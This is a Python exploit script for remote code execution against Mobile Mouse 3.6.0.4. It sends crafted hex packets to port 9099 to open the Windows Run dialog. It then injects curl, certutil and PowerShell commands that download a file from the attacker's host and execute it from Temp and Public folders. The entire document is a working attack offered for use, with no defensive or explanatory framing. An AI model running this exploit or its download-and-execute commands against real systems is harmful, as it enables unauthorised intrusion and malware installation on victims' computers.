#!/usr/bin/env python3

import socket
from time import sleep
import argparse

help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File name to Upload")
parser.add_argument("--lhost", help="Your local IP", default="127.0.0.1")

args = parser.parse_args()

host = args.target
command_shell = args.file
lhost = args.lhost
port = 9099  # Default Port

print(f"[*] Connecting to target {host}:{port}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((host, port))
    print("[+] Connection established")
except Exception as e:
    print(f"[-] Connection failed: {e}")
    exit(1)

print("[*] Sending initial connection packet")
CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
s.send(CONN)
run = s.recv(54)
print("[+] Initial connection packet sent")

print("[*] Opening Run dialog")
RUN = bytearray.fromhex("4B45591E3131341E721E4F505404")
s.send(RUN)
run = s.recv(54)
print("[+] Run dialog opened")

sleep(0.5)

# Download commands for both locations using multiple methods
download_commands = [
    f"curl http://{lhost}:8080/{command_shell} -o r\"c:\\Windows\\Temp\\{command_shell}\"",
    f"curl http://{lhost}:8080/{command_shell} -o r\"c:\\Users\\Public\\{command_shell}\"",
    f"certutil.exe -urlfetch -split -f http://{lhost}:8080/{command_shell} r\"c:\\Windows\\Temp\\{command_shell}\"",
    f"certutil.exe -urlfetch -split -f http://{lhost}:8080/{command_shell} r\"c:\\Users\\Public\\{command_shell}\"",
    f"powershell -c \"Invoke-WebRequest -Uri http://{lhost}:8080/{command_shell} -OutFile r'c:\\Windows\\Temp\\{command_shell}'\"",
    f"powershell -c \"Invoke-WebRequest -Uri http://{lhost}:8080/{command_shell} -OutFile r'c:\\Users\\Public\\{command_shell}'\""
]

print("[*] Attempting to download the file using multiple methods...")
for cmd in download_commands:
    print(f"[*] Executing: {cmd}")
    download_string = cmd.encode('utf-8')
    hex_shell = download_string.hex()
    SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" + "4B45591E2D311E454E5445521E04")
    s.send(SHELL)
    shell = s.recv(96)
    sleep(1)  # Small delay between commands to ensure execution
print("[+] Download commands sent")

print("[*] Waiting for downloads to complete (10 seconds)...")
sleep(10)

print("[*] Opening Run dialog again")
RUN2 = bytearray.fromhex("4B45591E3131341E721E4F505404")
s.send(RUN2)
run2 = s.recv(54)
print("[+] Run dialog opened")

sleep(0.8)

# Attempt to execute from both locations
execute_commands = [
    f"r\"c:\\Windows\\Temp\\{command_shell}\"",
    f"r\"c:\\Users\\Public\\{command_shell}\""
]

print("[*] Attempting to execute the command shell from both locations...")
for cmd in execute_commands:
    print(f"[*] Executing: {cmd}")
    shell_string = cmd.encode('utf-8')
    hex_run = shell_string.hex()
    RUN3 = bytearray.fromhex("4B45591E3130301E" + hex_run + "1E04" + "4B45591E2D311E454E5445521E04")
    s.send(RUN3)
    run3 = s.recv(96)
    sleep(1)  # Small delay between execution attempts
print("[+] Execution commands sent")

print("[*] Closing connection")
s.close()
print("[+] Connection closed")
